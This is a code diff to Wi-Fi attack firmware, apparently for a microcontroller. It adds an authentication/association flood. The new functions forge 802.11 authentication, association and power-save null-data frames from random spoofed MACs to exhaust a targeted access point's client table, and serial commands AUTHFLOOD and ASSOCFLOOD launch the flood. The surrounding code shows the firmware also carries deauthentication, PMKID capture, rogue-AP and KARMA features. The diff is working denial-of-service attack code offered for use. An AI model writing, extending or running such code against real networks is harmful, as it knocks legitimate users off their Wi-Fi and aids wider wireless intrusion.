@@ -1281,12 +1281,85 @@ static void pmkid_clientless(int ch, const uint8_t* bssid, const char* ssid) {
   wifi_tx_raw_frame(f, n);
 }
 
+// --- B5: authentication / association flood --------------------------------------------
+// An AP reserves state for every client that starts associating (an association-table slot), and
+// that slot is only freed when the entry times out or the client leaves. Blasting authentication
+// requests with random source MACs fills the table with clients that do not exist, so the AP has
+// no room (or no CPU) for its real ones until they expire. Association requests go further: many
+// APs allocate an AID before checking that the authentication really happened, and the null-data
+// frame with the power-management bit set then tells the AP the fake client is dozing, which is
+// what keeps its entry from being reaped. Only the AP is addressed - no frames go to any client.
+// (Flood frame layout follows pmkid_clientless() below, but with the auth algorithm/sequence in
+// their correct slots: algorithm 0x0000 = open system at offset 26, seq 1 at offset 28.)
+static uint8_t flood_sta[6];
+
+static void flood_mac_rand(void) {
+  for(int i = 0; i < 6; i++) flood_sta[i] = (uint8_t)random(0, 256);
+  flood_sta[0] = (uint8_t)((flood_sta[0] & 0xFC) | 0x02);   // unicast + locally administered
+}
+
+static void flood_tx_auth(const uint8_t* bssid, const uint8_t* sta) {
+  uint8_t f[30];
+  memset(f, 0, sizeof(f));
+  f[0] = 0xB0; f[1] = 0x00;                 // frame control: authentication
+  memcpy(f + 4, bssid, 6);                  // addr1: the AP
+  memcpy(f + 10, sta, 6);                   // addr2: the spoofed client
+  memcpy(f + 16, bssid, 6);                 // addr3: BSSID
+  f[26] = 0x00; f[27] = 0x00;               // auth algorithm: open system
+  f[28] = 0x01; f[29] = 0x00;               // auth sequence: 1
+  wifi_tx_raw_frame(f, 30);
+}
+
+static void flood_tx_assoc(const uint8_t* bssid, const uint8_t* sta, const char* ssid) {
+  uint8_t f[192];
+  int n = 0;
+  f[n++] = 0x00; f[n++] = 0x00;             // frame control: association request
+  f[n++] = 0x00; f[n++] = 0x00;             // duration
+  memcpy(f + n, bssid, 6); n += 6;          // addr1: the AP
+  memcpy(f + n, sta, 6); n += 6;            // addr2: the spoofed client
+  memcpy(f + n, bssid, 6); n += 6;          // addr3: BSSID
+  f[n++] = 0x00; f[n++] = 0x00;             // sequence (driver fills it)
+  f[n++] = 0x11; f[n++] = 0x04;             // capability: ESS | Privacy
+  f[n++] = 0x0A; f[n++] = 0x00;             // listen interval
+  int sl = ssid ? (int)strlen(ssid) : 0;
+  if(sl > 32) sl = 32;
+  f[n++] = 0x00; f[n++] = (uint8_t)sl;      // SSID element
+  memcpy(f + n, ssid, sl); n += sl;
+  f[n++] = 0x01; f[n++] = 0x08;             // supported rates
+  { const uint8_t r[8] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24}; memcpy(f + n, r, 8); n += 8; }
+  f[n++] = 0x32; f[n++] = 0x04;             // extended supported rates
+  { const uint8_t r[4] = {0x30,0x48,0x60,0x6C}; memcpy(f + n, r, 4); n += 4; }
+  { const uint8_t rsn[22] = {0x30,0x14,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x02,0x00,0x00};
+    memcpy(f + n, rsn, 22); n += 22; }
+  wifi_tx_raw_frame(f, n);
+}
+
+// Null data frame with the power-management bit set: "I am going to sleep". An AP keeps the
+// table entry of a dozing client instead of reaping it, so the flood's entries survive longer.
+static void flood_tx_sleep(const uint8_t* bssid, const uint8_t* sta) {
+  uint8_t f[24];
+  memset(f, 0, sizeof(f));
+  f[0] = 0x48; f[1] = 0x10;                 // frame control: null data, PM bit set
+  memcpy(f + 4, bssid, 6);
+  memcpy(f + 10, sta, 6);
+  memcpy(f + 16, bssid, 6);
+  wifi_tx_raw_frame(f, 24);
+}
+
+// The target's SSID from the last SCAN - many APs reject an association with an empty/wrong SSID.
+static String flood_ssid_for(const uint8_t* bssid) {
+  for(unsigned j = 0; j < scan_results.size(); j++)
+    if(!memcmp(scan_results[j].bssid, bssid, 6)) return scan_results[j].ssid;
+  return String("");
+}
+
 // --- A: HELLO/IDENT handshake + capability advertisement ----------------------
 // Mirrors 5Ghost's HELLO -> IDENT so a host can version-check and gate features.
 // caps letters (5Ghost-compatible): D=deauth S=stascan E=evil/AP B=beacon H=handshake.
+// Ours on top: L=ble I=iBeacon C=BLE adv K=KARMA R=responder T=btm F=auth/assoc flood.
 // We advertise "DSEBH" (no BLE -> no L/I/C/K).
 #define DELFY_FW_VERSION "1.0.0"
-#define DELFY_FW_CAPS "DSEBHLICKRT"
+#define DELFY_FW_CAPS "DSEBHLICKRTF"
 
 // --- C: P3 multi-target deauth list (DEAUTHADD / DEAUTHRUN) -------------------
 #define DAUTH_MAX 8
@@ -2207,6 +2280,46 @@ void loop() {
         wext_set_channel(WLAN0_NAME, apch);
         for(int i = 0; i < frames; i++) btm_send_frame(bssid, (uint8_t)newch, TX_BCAST);
         String r = String("BTM:") + String((unsigned)frames) + " ch=" + String(newch);
+        Serial.println(r); Serial1.println(r);
+      }
+    }else if(readString.substring(0,5)=="AUTHF" || readString.substring(0,5)=="ASSOC"){
+      // B5: AUTHFLOOD <bssid-12hex> <chan> [count]
+      //     ASSOCFLOOD <bssid-12hex> <chan> [count]   (auth + assoc + sleep per random MAC)
+      bool with_assoc = (readString.substring(0,5) == "ASSOC");
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
+      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
+      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
+      int count = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 64;
+      uint8_t bssid[6];
+      bool ok = (hex.length() == 12);
+      for(int i = 0; ok && i < 6; i++) {
+        int hi = hexnib(hex.charAt(i * 2));
+        int lo = hexnib(hex.charAt(i * 2 + 1));
+        if(hi < 0 || lo < 0) { ok = false; break; }
+        bssid[i] = (uint8_t)((hi << 4) | lo);
+      }
+      if(!ok) {
+        String e = String("ERROR: ") + (with_assoc ? "ASSOCFLOOD" : "AUTHFLOOD") + " needs a 12-hex bssid";
+        Serial.println(e); Serial1.println(e);
+      }else{
+        if(apch < 1 || apch > 165) apch = 6;
+        if(count < 1 || count > 500) count = 64;
+        if(apActive) destroyAP();
+        wext_set_channel(WLAN0_NAME, apch);
+        String ssid = with_assoc ? flood_ssid_for(bssid) : String("");
+        for(int i = 0; i < count; i++) {
+          flood_mac_rand();
+          flood_tx_auth(bssid, flood_sta);
+          if(with_assoc) {
+            flood_tx_assoc(bssid, flood_sta, ssid.c_str());
+            flood_tx_sleep(bssid, flood_sta);
+          }
+          if((i & 15) == 15) delay(2);   // let the WiFi task breathe every 16 frames
+        }
+        String r = (with_assoc ? "ASSOCFLOOD:" : "AUTHFLOOD:") + String((unsigned)count) +
+                   " ch=" + String(apch) + (with_assoc ? (" ssid=" + ssid) : "");
         Serial.println(r); Serial1.println(r);
       }
     }else if(readString.substring(0,7)=="CSASTAS"){
